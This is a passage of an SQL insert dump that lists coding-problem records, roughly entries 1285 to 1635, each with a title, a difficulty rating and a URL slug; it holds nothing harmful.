Matrix','Hard','minimum-number-of-flips-to-convert-binary-matrix-to-zero-matrix',1),(1285,'Find the Start and End Number of Continuous Ranges','Medium','find-the-start-and-end-number-of-continuous-ranges',1),(1286,'Iterator for Combination','Medium','iterator-for-combination',1),(1287,'Element Appearing More Than 25% In Sorted Array','Easy','element-appearing-more-than-25-in-sorted-array',1),(1288,'Remove Covered Intervals','Medium','remove-covered-intervals',1),(1289,'Minimum Falling Path Sum II','Hard','minimum-falling-path-sum-ii',1),(1290,'Convert Binary Number in a Linked List to Integer','Easy','convert-binary-number-in-a-linked-list-to-integer',1),(1291,'Sequential Digits','Medium','sequential-digits',1),(1292,'Maximum Side Length of a Square with Sum Less than or Equal to Threshold','Medium','maximum-side-length-of-a-square-with-sum-less-than-or-equal-to-threshold',1),(1293,'Shortest Path in a Grid with Obstacles Elimination','Hard','shortest-path-in-a-grid-with-obstacles-elimination',1),(1294,'Weather Type in Each Country','Easy','weather-type-in-each-country',1),(1295,'Find Numbers with Even Number of Digits','Easy','find-numbers-with-even-number-of-digits',1),(1296,'Divide Array in Sets of K Consecutive Numbers','Medium','divide-array-in-sets-of-k-consecutive-numbers',1),(1297,'Maximum Number of Occurrences of a Substring','Medium','maximum-number-of-occurrences-of-a-substring',1),(1298,'Maximum Candies You Can Get from Boxes','Hard','maximum-candies-you-can-get-from-boxes',1),(1299,'Replace Elements with Greatest Element on Right Side','Easy','replace-elements-with-greatest-element-on-right-side',1),(1300,'Sum of Mutated Array Closest to Target','Medium','sum-of-mutated-array-closest-to-target',1),(1301,'Number of Paths with Max Score','Hard','number-of-paths-with-max-score',1),(1302,'Deepest Leaves Sum','Medium','deepest-leaves-sum',1),(1303,'Find the Team Size','Easy','find-the-team-size',1),(1304,'Find N Unique Integers Sum up to Zero','Easy','find-n-unique-integers-sum-up-to-zero',1),(1305,'All Elements in Two Binary Search Trees','Medium','all-elements-in-two-binary-search-trees',1),(1306,'Jump Game III','Medium','jump-game-iii',1),(1307,'Verbal Arithmetic Puzzle','Hard','verbal-arithmetic-puzzle',1),(1308,'Running Total for Different Genders','Medium','running-total-for-different-genders',1),(1309,'Decrypt String from Alphabet to Integer Mapping','Easy','decrypt-string-from-alphabet-to-integer-mapping',1),(1310,'XOR Queries of a Subarray','Medium','xor-queries-of-a-subarray',1),(1311,'Get Watched Videos by Your Friends','Medium','get-watched-videos-by-your-friends',1),(1312,'Minimum Insertion Steps to Make a String Palindrome','Hard','minimum-insertion-steps-to-make-a-string-palindrome',1),(1313,'Decompress Run-Length Encoded List','Easy','decompress-run-length-encoded-list',1),(1314,'Matrix Block Sum','Medium','matrix-block-sum',1),(1315,'Sum of Nodes with Even-Valued Grandparent','Medium','sum-of-nodes-with-even-valued-grandparent',1),(1316,'Distinct Echo Substrings','Hard','distinct-echo-substrings',1),(1317,'Convert Integer to the Sum of Two No-Zero Integers','Easy','convert-integer-to-the-sum-of-two-no-zero-integers',1),(1318,'Minimum Flips to Make a OR b Equal to c','Medium','minimum-flips-to-make-a-or-b-equal-to-c',1),(1319,'Number of Operations to Make Network Connected','Medium','number-of-operations-to-make-network-connected',1),(1320,'Minimum Distance to Type a Word Using Two Fingers','Hard','minimum-distance-to-type-a-word-using-two-fingers',1),(1321,'Restaurant Growth','Medium','restaurant-growth',1),(1322,'Ads Performance','Easy','ads-performance',1),(1323,'Maximum 69 Number','Easy','maximum-69-number',1),(1324,'Print Words Vertically','Medium','print-words-vertically',1),(1325,'Delete Leaves With a Given Value','Medium','delete-leaves-with-a-given-value',1),(1326,'Minimum Number of Taps to Open to Water a Garden','Hard','minimum-number-of-taps-to-open-to-water-a-garden',1),(1327,'List the Products Ordered in a Period','Easy','list-the-products-ordered-in-a-period',1),(1328,'Break a Palindrome','Medium','break-a-palindrome',1),(1329,'Sort the Matrix Diagonally','Medium','sort-the-matrix-diagonally',1),(1330,'Reverse Subarray To Maximize Array Value','Hard','reverse-subarray-to-maximize-array-value',1),(1331,'Rank Transform of an Array','Easy','rank-transform-of-an-array',1),(1332,'Remove Palindromic Subsequences','Easy','remove-palindromic-subsequences',1),(1333,'Filter Restaurants by Vegan-Friendly, Price and Distance','Medium','filter-restaurants-by-vegan-friendly-price-and-distance',1),(1334,'Find the City With the Smallest Number of Neighbors at a Threshold Distance','Medium','find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance',1),(1335,'Minimum Difficulty of a Job Schedule','Hard','minimum-difficulty-of-a-job-schedule',1),(1336,'Number of Transactions per Visit','Hard','number-of-transactions-per-visit',1),(1337,'The K Weakest Rows in a Matrix','Easy','the-k-weakest-rows-in-a-matrix',1),(1338,'Reduce Array Size to The Half','Medium','reduce-array-size-to-the-half',1),(1339,'Maximum Product of Splitted Binary Tree','Medium','maximum-product-of-splitted-binary-tree',1),(1340,'Jump Game V','Hard','jump-game-v',1),(1341,'Movie Rating','Medium','movie-rating',1),(1342,'Number of Steps to Reduce a Number to Zero','Easy','number-of-steps-to-reduce-a-number-to-zero',1),(1343,'Number of Sub-arrays of Size K and Average Greater than or Equal to Threshold','Medium','number-of-sub-arrays-of-size-k-and-average-greater-than-or-equal-to-threshold',1),(1344,'Angle Between Hands of a Clock','Medium','angle-between-hands-of-a-clock',1),(1345,'Jump Game IV','Hard','jump-game-iv',1),(1346,'Check If N and Its Double Exist','Easy','check-if-n-and-its-double-exist',1),(1347,'Minimum Number of Steps to Make Two Strings Anagram','Medium','minimum-number-of-steps-to-make-two-strings-anagram',1),(1348,'Tweet Counts Per Frequency','Medium','tweet-counts-per-frequency',1),(1349,'Maximum Students Taking Exam','Hard','maximum-students-taking-exam',1),(1350,'Students With Invalid Departments','Easy','students-with-invalid-departments',1),(1351,'Count Negative Numbers in a Sorted Matrix','Easy','count-negative-numbers-in-a-sorted-matrix',1),(1352,'Product of the Last K Numbers','Medium','product-of-the-last-k-numbers',1),(1353,'Maximum Number of Events That Can Be Attended','Medium','maximum-number-of-events-that-can-be-attended',1),(1354,'Construct Target Array With Multiple Sums','Hard','construct-target-array-with-multiple-sums',1),(1355,'Activity Participants','Medium','activity-participants',1),(1356,'Sort Integers by The Number of 1 Bits','Easy','sort-integers-by-the-number-of-1-bits',1),(1357,'Apply Discount Every n Orders','Medium','apply-discount-every-n-orders',1),(1358,'Number of Substrings Containing All Three Characters','Medium','number-of-substrings-containing-all-three-characters',1),(1359,'Count All Valid Pickup and Delivery Options','Hard','count-all-valid-pickup-and-delivery-options',1),(1360,'Number of Days Between Two Dates','Easy','number-of-days-between-two-dates',1),(1361,'Validate Binary Tree Nodes','Medium','validate-binary-tree-nodes',1),(1362,'Closest Divisors','Medium','closest-divisors',1),(1363,'Largest Multiple of Three','Hard','largest-multiple-of-three',1),(1364,'Number of Trusted Contacts of a Customer','Medium','number-of-trusted-contacts-of-a-customer',1),(1365,'How Many Numbers Are Smaller Than the Current Number','Easy','how-many-numbers-are-smaller-than-the-current-number',1),(1366,'Rank Teams by Votes','Medium','rank-teams-by-votes',1),(1367,'Linked List in Binary Tree','Medium','linked-list-in-binary-tree',1),(1368,'Minimum Cost to Make at Least One Valid Path in a Grid','Hard','minimum-cost-to-make-at-least-one-valid-path-in-a-grid',1),(1369,'Get the Second Most Recent Activity','Hard','get-the-second-most-recent-activity',1),(1370,'Increasing Decreasing String','Easy','increasing-decreasing-string',1),(1371,'Find the Longest Substring Containing Vowels in Even Counts','Medium','find-the-longest-substring-containing-vowels-in-even-counts',1),(1372,'Longest ZigZag Path in a Binary Tree','Medium','longest-zigzag-path-in-a-binary-tree',1),(1373,'Maximum Sum BST in Binary Tree','Hard','maximum-sum-bst-in-binary-tree',1),(1374,'Generate a String With Characters That Have Odd Counts','Easy','generate-a-string-with-characters-that-have-odd-counts',1),(1375,'Number of Times Binary String Is Prefix-Aligned','Medium','number-of-times-binary-string-is-prefix-aligned',1),(1376,'Time Needed to Inform All Employees','Medium','time-needed-to-inform-all-employees',1),(1377,'Frog Position After T Seconds','Hard','frog-position-after-t-seconds',1),(1378,'Replace Employee ID With The Unique Identifier','Easy','replace-employee-id-with-the-unique-identifier',1),(1379,'Find a Corresponding Node of a Binary Tree in a Clone of That Tree','Easy','find-a-corresponding-node-of-a-binary-tree-in-a-clone-of-that-tree',1),(1380,'Lucky Numbers in a Matrix','Easy','lucky-numbers-in-a-matrix',1),(1381,'Design a Stack With Increment Operation','Medium','design-a-stack-with-increment-operation',1),(1382,'Balance a Binary Search Tree','Medium','balance-a-binary-search-tree',1),(1383,'Maximum Performance of a Team','Hard','maximum-performance-of-a-team',1),(1384,'Total Sales Amount by Year','Hard','total-sales-amount-by-year',1),(1385,'Find the Distance Value Between Two Arrays','Easy','find-the-distance-value-between-two-arrays',1),(1386,'Cinema Seat Allocation','Medium','cinema-seat-allocation',1),(1387,'Sort Integers by The Power Value','Medium','sort-integers-by-the-power-value',1),(1388,'Pizza With 3n Slices','Hard','pizza-with-3n-slices',1),(1389,'Create Target Array in the Given Order','Easy','create-target-array-in-the-given-order',1),(1390,'Four Divisors','Medium','four-divisors',1),(1391,'Check if There is a Valid Path in a Grid','Medium','check-if-there-is-a-valid-path-in-a-grid',1),(1392,'Longest Happy Prefix','Hard','longest-happy-prefix',1),(1393,'Capital Gain/Loss','Medium','capital-gainloss',1),(1394,'Find Lucky Integer in an Array','Easy','find-lucky-integer-in-an-array',1),(1395,'Count Number of Teams','Medium','count-number-of-teams',1),(1396,'Design Underground System','Medium','design-underground-system',1),(1397,'Find All Good Strings','Hard','find-all-good-strings',1),(1398,'Customers Who Bought Products A and B but Not C','Medium','customers-who-bought-products-a-and-b-but-not-c',1),(1399,'Count Largest Group','Easy','count-largest-group',1),(1400,'Construct K Palindrome Strings','Medium','construct-k-palindrome-strings',1),(1401,'Circle and Rectangle Overlapping','Medium','circle-and-rectangle-overlapping',1),(1402,'Reducing Dishes','Hard','reducing-dishes',1),(1403,'Minimum Subsequence in Non-Increasing Order','Easy','minimum-subsequence-in-non-increasing-order',1),(1404,'Number of Steps to Reduce a Number in Binary Representation to One','Medium','number-of-steps-to-reduce-a-number-in-binary-representation-to-one',1),(1405,'Longest Happy String','Medium','longest-happy-string',1),(1406,'Stone Game III','Hard','stone-game-iii',1),(1407,'Top Travellers','Easy','top-travellers',1),(1408,'String Matching in an Array','Easy','string-matching-in-an-array',1),(1409,'Queries on a Permutation With Key','Medium','queries-on-a-permutation-with-key',1),(1410,'HTML Entity Parser','Medium','html-entity-parser',1),(1411,'Number of Ways to Paint N × 3 Grid','Hard','number-of-ways-to-paint-n-3-grid',1),(1412,'Find the Quiet Students in All Exams','Hard','find-the-quiet-students-in-all-exams',1),(1413,'Minimum Value to Get Positive Step by Step Sum','Easy','minimum-value-to-get-positive-step-by-step-sum',1),(1414,'Find the Minimum Number of Fibonacci Numbers Whose Sum Is K','Medium','find-the-minimum-number-of-fibonacci-numbers-whose-sum-is-k',1),(1415,'The k-th Lexicographical String of All Happy Strings of Length n','Medium','the-k-th-lexicographical-string-of-all-happy-strings-of-length-n',1),(1416,'Restore The Array','Hard','restore-the-array',1),(1417,'Reformat The String','Easy','reformat-the-string',1),(1418,'Display Table of Food Orders in a Restaurant','Medium','display-table-of-food-orders-in-a-restaurant',1),(1419,'Minimum Number of Frogs Croaking','Medium','minimum-number-of-frogs-croaking',1),(1420,'Build Array Where You Can Find The Maximum Exactly K Comparisons','Hard','build-array-where-you-can-find-the-maximum-exactly-k-comparisons',1),(1421,'NPV Queries','Easy','npv-queries',1),(1422,'Maximum Score After Splitting a String','Easy','maximum-score-after-splitting-a-string',1),(1423,'Maximum Points You Can Obtain from Cards','Medium','maximum-points-you-can-obtain-from-cards',1),(1424,'Diagonal Traverse II','Medium','diagonal-traverse-ii',1),(1425,'Constrained Subsequence Sum','Hard','constrained-subsequence-sum',1),(1426,'Counting Elements','Easy','counting-elements',1),(1427,'Perform String Shifts','Easy','perform-string-shifts',1),(1428,'Leftmost Column with at Least a One','Medium','leftmost-column-with-at-least-a-one',1),(1429,'First Unique Number','Medium','first-unique-number',1),(1430,'Check If a String Is a Valid Sequence from Root to Leaves Path in a Binary Tree','Medium','check-if-a-string-is-a-valid-sequence-from-root-to-leaves-path-in-a-binary-tree',1),(1431,'Kids With the Greatest Number of Candies','Easy','kids-with-the-greatest-number-of-candies',1),(1432,'Max Difference You Can Get From Changing an Integer','Medium','max-difference-you-can-get-from-changing-an-integer',1),(1433,'Check If a String Can Break Another String','Medium','check-if-a-string-can-break-another-string',1),(1434,'Number of Ways to Wear Different Hats to Each Other','Hard','number-of-ways-to-wear-different-hats-to-each-other',1),(1435,'Create a Session Bar Chart','Easy','create-a-session-bar-chart',1),(1436,'Destination City','Easy','destination-city',1),(1437,'Check If All 1\'s Are at Least Length K Places Away','Easy','check-if-all-1s-are-at-least-length-k-places-away',1),(1438,'Longest Continuous Subarray With Absolute Diff Less Than or Equal to Limit','Medium','longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit',1),(1439,'Find the Kth Smallest Sum of a Matrix With Sorted Rows','Hard','find-the-kth-smallest-sum-of-a-matrix-with-sorted-rows',1),(1440,'Evaluate Boolean Expression','Medium','evaluate-boolean-expression',1),(1441,'Build an Array With Stack Operations','Medium','build-an-array-with-stack-operations',1),(1442,'Count Triplets That Can Form Two Arrays of Equal XOR','Medium','count-triplets-that-can-form-two-arrays-of-equal-xor',1),(1443,'Minimum Time to Collect All Apples in a Tree','Medium','minimum-time-to-collect-all-apples-in-a-tree',1),(1444,'Number of Ways of Cutting a Pizza','Hard','number-of-ways-of-cutting-a-pizza',1),(1445,'Apples & Oranges','Medium','apples-oranges',1),(1446,'Consecutive Characters','Easy','consecutive-characters',1),(1447,'Simplified Fractions','Medium','simplified-fractions',1),(1448,'Count Good Nodes in Binary Tree','Medium','count-good-nodes-in-binary-tree',1),(1449,'Form Largest Integer With Digits That Add up to Target','Hard','form-largest-integer-with-digits-that-add-up-to-target',1),(1450,'Number of Students Doing Homework at a Given Time','Easy','number-of-students-doing-homework-at-a-given-time',1),(1451,'Rearrange Words in a Sentence','Medium','rearrange-words-in-a-sentence',1),(1452,'People Whose List of Favorite Companies Is Not a Subset of Another List','Medium','people-whose-list-of-favorite-companies-is-not-a-subset-of-another-list',1),(1453,'Maximum Number of Darts Inside of a Circular Dartboard','Hard','maximum-number-of-darts-inside-of-a-circular-dartboard',1),(1454,'Active Users','Medium','active-users',1),(1455,'Check If a Word Occurs As a Prefix of Any Word in a Sentence','Easy','check-if-a-word-occurs-as-a-prefix-of-any-word-in-a-sentence',1),(1456,'Maximum Number of Vowels in a Substring of Given Length','Medium','maximum-number-of-vowels-in-a-substring-of-given-length',1),(1457,'Pseudo-Palindromic Paths in a Binary Tree','Medium','pseudo-palindromic-paths-in-a-binary-tree',1),(1458,'Max Dot Product of Two Subsequences','Hard','max-dot-product-of-two-subsequences',1),(1459,'Rectangles Area','Medium','rectangles-area',1),(1460,'Make Two Arrays Equal by Reversing Subarrays','Easy','make-two-arrays-equal-by-reversing-subarrays',1),(1461,'Check If a String Contains All Binary Codes of Size K','Medium','check-if-a-string-contains-all-binary-codes-of-size-k',1),(1462,'Course Schedule IV','Medium','course-schedule-iv',1),(1463,'Cherry Pickup II','Hard','cherry-pickup-ii',1),(1464,'Maximum Product of Two Elements in an Array','Easy','maximum-product-of-two-elements-in-an-array',1),(1465,'Maximum Area of a Piece of Cake After Horizontal and Vertical Cuts','Medium','maximum-area-of-a-piece-of-cake-after-horizontal-and-vertical-cuts',1),(1466,'Reorder Routes to Make All Paths Lead to the City Zero','Medium','reorder-routes-to-make-all-paths-lead-to-the-city-zero',1),(1467,'Probability of a Two Boxes Having The Same Number of Distinct Balls','Hard','probability-of-a-two-boxes-having-the-same-number-of-distinct-balls',1),(1468,'Calculate Salaries','Medium','calculate-salaries',1),(1469,'Find All The Lonely Nodes','Easy','find-all-the-lonely-nodes',1),(1470,'Shuffle the Array','Easy','shuffle-the-array',1),(1471,'The k Strongest Values in an Array','Medium','the-k-strongest-values-in-an-array',1),(1472,'Design Browser History','Medium','design-browser-history',1),(1473,'Paint House III','Hard','paint-house-iii',1),(1474,'Delete N Nodes After M Nodes of a Linked List','Easy','delete-n-nodes-after-m-nodes-of-a-linked-list',1),(1475,'Final Prices With a Special Discount in a Shop','Easy','final-prices-with-a-special-discount-in-a-shop',1),(1476,'Subrectangle Queries','Medium','subrectangle-queries',1),(1477,'Find Two Non-overlapping Sub-arrays Each With Target Sum','Medium','find-two-non-overlapping-sub-arrays-each-with-target-sum',1),(1478,'Allocate Mailboxes','Hard','allocate-mailboxes',1),(1479,'Sales by Day of the Week','Hard','sales-by-day-of-the-week',1),(1480,'Running Sum of 1d Array','Easy','running-sum-of-1d-array',1),(1481,'Least Number of Unique Integers after K Removals','Medium','least-number-of-unique-integers-after-k-removals',1),(1482,'Minimum Number of Days to Make m Bouquets','Medium','minimum-number-of-days-to-make-m-bouquets',1),(1483,'Kth Ancestor of a Tree Node','Hard','kth-ancestor-of-a-tree-node',1),(1484,'Group Sold Products By The Date','Easy','group-sold-products-by-the-date',1),(1485,'Clone Binary Tree With Random Pointer','Medium','clone-binary-tree-with-random-pointer',1),(1486,'XOR Operation in an Array','Easy','xor-operation-in-an-array',1),(1487,'Making File Names Unique','Medium','making-file-names-unique',1),(1488,'Avoid Flood in The City','Medium','avoid-flood-in-the-city',1),(1489,'Find Critical and Pseudo-Critical Edges in Minimum Spanning Tree','Hard','find-critical-and-pseudo-critical-edges-in-minimum-spanning-tree',1),(1490,'Clone N-ary Tree','Medium','clone-n-ary-tree',1),(1491,'Average Salary Excluding the Minimum and Maximum Salary','Easy','average-salary-excluding-the-minimum-and-maximum-salary',1),(1492,'The kth Factor of n','Medium','the-kth-factor-of-n',1),(1493,'Longest Subarray of 1\'s After Deleting One Element','Medium','longest-subarray-of-1s-after-deleting-one-element',1),(1494,'Parallel Courses II','Hard','parallel-courses-ii',1),(1495,'Friendly Movies Streamed Last Month','Easy','friendly-movies-streamed-last-month',1),(1496,'Path Crossing','Easy','path-crossing',1),(1497,'Check If Array Pairs Are Divisible by k','Medium','check-if-array-pairs-are-divisible-by-k',1),(1498,'Number of Subsequences That Satisfy the Given Sum Condition','Medium','number-of-subsequences-that-satisfy-the-given-sum-condition',1),(1499,'Max Value of Equation','Hard','max-value-of-equation',1),(1500,'Design a File Sharing System','Medium','design-a-file-sharing-system',1),(1501,'Countries You Can Safely Invest In','Medium','countries-you-can-safely-invest-in',1),(1502,'Can Make Arithmetic Progression From Sequence','Easy','can-make-arithmetic-progression-from-sequence',1),(1503,'Last Moment Before All Ants Fall Out of a Plank','Medium','last-moment-before-all-ants-fall-out-of-a-plank',1),(1504,'Count Submatrices With All Ones','Medium','count-submatrices-with-all-ones',1),(1505,'Minimum Possible Integer After at Most K Adjacent Swaps On Digits','Hard','minimum-possible-integer-after-at-most-k-adjacent-swaps-on-digits',1),(1506,'Find Root of N-Ary Tree','Medium','find-root-of-n-ary-tree',1),(1507,'Reformat Date','Easy','reformat-date',1),(1508,'Range Sum of Sorted Subarray Sums','Medium','range-sum-of-sorted-subarray-sums',1),(1509,'Minimum Difference Between Largest and Smallest Value in Three Moves','Medium','minimum-difference-between-largest-and-smallest-value-in-three-moves',1),(1510,'Stone Game IV','Hard','stone-game-iv',1),(1511,'Customer Order Frequency','Easy','customer-order-frequency',1),(1512,'Number of Good Pairs','Easy','number-of-good-pairs',1),(1513,'Number of Substrings With Only 1s','Medium','number-of-substrings-with-only-1s',1),(1514,'Path with Maximum Probability','Medium','path-with-maximum-probability',1),(1515,'Best Position for a Service Centre','Hard','best-position-for-a-service-centre',1),(1516,'Move Sub-Tree of N-Ary Tree','Hard','move-sub-tree-of-n-ary-tree',1),(1517,'Find Users With Valid E-Mails','Easy','find-users-with-valid-e-mails',1),(1518,'Water Bottles','Easy','water-bottles',1),(1519,'Number of Nodes in the Sub-Tree With the Same Label','Medium','number-of-nodes-in-the-sub-tree-with-the-same-label',1),(1520,'Maximum Number of Non-Overlapping Substrings','Hard','maximum-number-of-non-overlapping-substrings',1),(1521,'Find a Value of a Mysterious Function Closest to Target','Hard','find-a-value-of-a-mysterious-function-closest-to-target',1),(1522,'Diameter of N-Ary Tree','Medium','diameter-of-n-ary-tree',1),(1523,'Count Odd Numbers in an Interval Range','Easy','count-odd-numbers-in-an-interval-range',1),(1524,'Number of Sub-arrays With Odd Sum','Medium','number-of-sub-arrays-with-odd-sum',1),(1525,'Number of Good Ways to Split a String','Medium','number-of-good-ways-to-split-a-string',1),(1526,'Minimum Number of Increments on Subarrays to Form a Target Array','Hard','minimum-number-of-increments-on-subarrays-to-form-a-target-array',1),(1527,'Patients With a Condition','Easy','patients-with-a-condition',1),(1528,'Shuffle String','Easy','shuffle-string',1),(1529,'Minimum Suffix Flips','Medium','minimum-suffix-flips',1),(1530,'Number of Good Leaf Nodes Pairs','Medium','number-of-good-leaf-nodes-pairs',1),(1531,'String Compression II','Hard','string-compression-ii',1),(1532,'The Most Recent Three Orders','Medium','the-most-recent-three-orders',1),(1533,'Find the Index of the Large Integer','Medium','find-the-index-of-the-large-integer',1),(1534,'Count Good Triplets','Easy','count-good-triplets',1),(1535,'Find the Winner of an Array Game','Medium','find-the-winner-of-an-array-game',1),(1536,'Minimum Swaps to Arrange a Binary Grid','Medium','minimum-swaps-to-arrange-a-binary-grid',1),(1537,'Get the Maximum Score','Hard','get-the-maximum-score',1),(1538,'Guess the Majority in a Hidden Array','Medium','guess-the-majority-in-a-hidden-array',1),(1539,'Kth Missing Positive Number','Easy','kth-missing-positive-number',1),(1540,'Can Convert String in K Moves','Medium','can-convert-string-in-k-moves',1),(1541,'Minimum Insertions to Balance a Parentheses String','Medium','minimum-insertions-to-balance-a-parentheses-string',1),(1542,'Find Longest Awesome Substring','Hard','find-longest-awesome-substring',1),(1543,'Fix Product Name Format','Easy','fix-product-name-format',1),(1544,'Make The String Great','Easy','make-the-string-great',1),(1545,'Find Kth Bit in Nth Binary String','Medium','find-kth-bit-in-nth-binary-string',1),(1546,'Maximum Number of Non-Overlapping Subarrays With Sum Equals Target','Medium','maximum-number-of-non-overlapping-subarrays-with-sum-equals-target',1),(1547,'Minimum Cost to Cut a Stick','Hard','minimum-cost-to-cut-a-stick',1),(1548,'The Most Similar Path in a Graph','Hard','the-most-similar-path-in-a-graph',1),(1549,'The Most Recent Orders for Each Product','Medium','the-most-recent-orders-for-each-product',1),(1550,'Three Consecutive Odds','Easy','three-consecutive-odds',1),(1551,'Minimum Operations to Make Array Equal','Medium','minimum-operations-to-make-array-equal',1),(1552,'Magnetic Force Between Two Balls','Medium','magnetic-force-between-two-balls',1),(1553,'Minimum Number of Days to Eat N Oranges','Hard','minimum-number-of-days-to-eat-n-oranges',1),(1554,'Strings Differ by One Character','Medium','strings-differ-by-one-character',1),(1555,'Bank Account Summary','Medium','bank-account-summary',1),(1556,'Thousand Separator','Easy','thousand-separator',1),(1557,'Minimum Number of Vertices to Reach All Nodes','Medium','minimum-number-of-vertices-to-reach-all-nodes',1),(1558,'Minimum Numbers of Function Calls to Make Target Array','Medium','minimum-numbers-of-function-calls-to-make-target-array',1),(1559,'Detect Cycles in 2D Grid','Medium','detect-cycles-in-2d-grid',1),(1560,'Most Visited Sector in  a Circular Track','Easy','most-visited-sector-in-a-circular-track',1),(1561,'Maximum Number of Coins You Can Get','Medium','maximum-number-of-coins-you-can-get',1),(1562,'Find Latest Group of Size M','Medium','find-latest-group-of-size-m',1),(1563,'Stone Game V','Hard','stone-game-v',1),(1564,'Put Boxes Into the Warehouse I','Medium','put-boxes-into-the-warehouse-i',1),(1565,'Unique Orders and Customers Per Month','Easy','unique-orders-and-customers-per-month',1),(1566,'Detect Pattern of Length M Repeated K or More Times','Easy','detect-pattern-of-length-m-repeated-k-or-more-times',1),(1567,'Maximum Length of Subarray With Positive Product','Medium','maximum-length-of-subarray-with-positive-product',1),(1568,'Minimum Number of Days to Disconnect Island','Hard','minimum-number-of-days-to-disconnect-island',1),(1569,'Number of Ways to Reorder Array to Get Same BST','Hard','number-of-ways-to-reorder-array-to-get-same-bst',1),(1570,'Dot Product of Two Sparse Vectors','Medium','dot-product-of-two-sparse-vectors',1),(1571,'Warehouse Manager','Easy','warehouse-manager',1),(1572,'Matrix Diagonal Sum','Easy','matrix-diagonal-sum',1),(1573,'Number of Ways to Split a String','Medium','number-of-ways-to-split-a-string',1),(1574,'Shortest Subarray to be Removed to Make Array Sorted','Medium','shortest-subarray-to-be-removed-to-make-array-sorted',1),(1575,'Count All Possible Routes','Hard','count-all-possible-routes',1),(1576,'Replace All ?\'s to Avoid Consecutive Repeating Characters','Easy','replace-all-s-to-avoid-consecutive-repeating-characters',1),(1577,'Number of Ways Where Square of Number Is Equal to Product of Two Numbers','Medium','number-of-ways-where-square-of-number-is-equal-to-product-of-two-numbers',1),(1578,'Minimum Time to Make Rope Colorful','Medium','minimum-time-to-make-rope-colorful',1),(1579,'Remove Max Number of Edges to Keep Graph Fully Traversable','Hard','remove-max-number-of-edges-to-keep-graph-fully-traversable',1),(1580,'Put Boxes Into the Warehouse II','Medium','put-boxes-into-the-warehouse-ii',1),(1581,'Customer Who Visited but Did Not Make Any Transactions','Easy','customer-who-visited-but-did-not-make-any-transactions',1),(1582,'Special Positions in a Binary Matrix','Easy','special-positions-in-a-binary-matrix',1),(1583,'Count Unhappy Friends','Medium','count-unhappy-friends',1),(1584,'Min Cost to Connect All Points','Medium','min-cost-to-connect-all-points',1),(1585,'Check If String Is Transformable With Substring Sort Operations','Hard','check-if-string-is-transformable-with-substring-sort-operations',1),(1586,'Binary Search Tree Iterator II','Medium','binary-search-tree-iterator-ii',1),(1587,'Bank Account Summary II','Easy','bank-account-summary-ii',1),(1588,'Sum of All Odd Length Subarrays','Easy','sum-of-all-odd-length-subarrays',1),(1589,'Maximum Sum Obtained of Any Permutation','Medium','maximum-sum-obtained-of-any-permutation',1),(1590,'Make Sum Divisible by P','Medium','make-sum-divisible-by-p',1),(1591,'Strange Printer II','Hard','strange-printer-ii',1),(1592,'Rearrange Spaces Between Words','Easy','rearrange-spaces-between-words',1),(1593,'Split a String Into the Max Number of Unique Substrings','Medium','split-a-string-into-the-max-number-of-unique-substrings',1),(1594,'Maximum Non Negative Product in a Matrix','Medium','maximum-non-negative-product-in-a-matrix',1),(1595,'Minimum Cost to Connect Two Groups of Points','Hard','minimum-cost-to-connect-two-groups-of-points',1),(1596,'The Most Frequently Ordered Products for Each Customer','Medium','the-most-frequently-ordered-products-for-each-customer',1),(1597,'Build Binary Expression Tree From Infix Expression','Hard','build-binary-expression-tree-from-infix-expression',1),(1598,'Crawler Log Folder','Easy','crawler-log-folder',1),(1599,'Maximum Profit of Operating a Centennial Wheel','Medium','maximum-profit-of-operating-a-centennial-wheel',1),(1600,'Throne Inheritance','Medium','throne-inheritance',1),(1601,'Maximum Number of Achievable Transfer Requests','Hard','maximum-number-of-achievable-transfer-requests',1),(1602,'Find Nearest Right Node in Binary Tree','Medium','find-nearest-right-node-in-binary-tree',1),(1603,'Design Parking System','Easy','design-parking-system',1),(1604,'Alert Using Same Key-Card Three or More Times in a One Hour Period','Medium','alert-using-same-key-card-three-or-more-times-in-a-one-hour-period',1),(1605,'Find Valid Matrix Given Row and Column Sums','Medium','find-valid-matrix-given-row-and-column-sums',1),(1606,'Find Servers That Handled Most Number of Requests','Hard','find-servers-that-handled-most-number-of-requests',1),(1607,'Sellers With No Sales','Easy','sellers-with-no-sales',1),(1608,'Special Array With X Elements Greater Than or Equal X','Easy','special-array-with-x-elements-greater-than-or-equal-x',1),(1609,'Even Odd Tree','Medium','even-odd-tree',1),(1610,'Maximum Number of Visible Points','Hard','maximum-number-of-visible-points',1),(1611,'Minimum One Bit Operations to Make Integers Zero','Hard','minimum-one-bit-operations-to-make-integers-zero',1),(1612,'Check If Two Expression Trees are Equivalent','Medium','check-if-two-expression-trees-are-equivalent',1),(1613,'Find the Missing IDs','Medium','find-the-missing-ids',1),(1614,'Maximum Nesting Depth of the Parentheses','Easy','maximum-nesting-depth-of-the-parentheses',1),(1615,'Maximal Network Rank','Medium','maximal-network-rank',1),(1616,'Split Two Strings to Make Palindrome','Medium','split-two-strings-to-make-palindrome',1),(1617,'Count Subtrees With Max Distance Between Cities','Hard','count-subtrees-with-max-distance-between-cities',1),(1618,'Maximum Font to Fit a Sentence in a Screen','Medium','maximum-font-to-fit-a-sentence-in-a-screen',1),(1619,'Mean of Array After Removing Some Elements','Easy','mean-of-array-after-removing-some-elements',1),(1620,'Coordinate With Maximum Network Quality','Medium','coordinate-with-maximum-network-quality',1),(1621,'Number of Sets of K Non-Overlapping Line Segments','Medium','number-of-sets-of-k-non-overlapping-line-segments',1),(1622,'Fancy Sequence','Hard','fancy-sequence',1),(1623,'All Valid Triplets That Can Represent a Country','Easy','all-valid-triplets-that-can-represent-a-country',1),(1624,'Largest Substring Between Two Equal Characters','Easy','largest-substring-between-two-equal-characters',1),(1625,'Lexicographically Smallest String After Applying Operations','Medium','lexicographically-smallest-string-after-applying-operations',1),(1626,'Best Team With No Conflicts','Medium','best-team-with-no-conflicts',1),(1627,'Graph Connectivity With Threshold','Hard','graph-connectivity-with-threshold',1),(1628,'Design an Expression Tree With Evaluate Function','Medium','design-an-expression-tree-with-evaluate-function',1),(1629,'Slowest Key','Easy','slowest-key',1),(1630,'Arithmetic Subarrays','Medium','arithmetic-subarrays',1),(1631,'Path With Minimum Effort','Medium','path-with-minimum-effort',1),(1632,'Rank Transform of a Matrix','Hard','rank-transform-of-a-matrix',1),(1633,'Percentage of Users Attended a Contest','Easy','percentage-of-users-attended-a-contest',1),(1634,'Add Two Polynomials Represented as Linked Lists','Medium','add-two-polynomials-represented-as-linked-lists',1),(1635,'Hopper Company 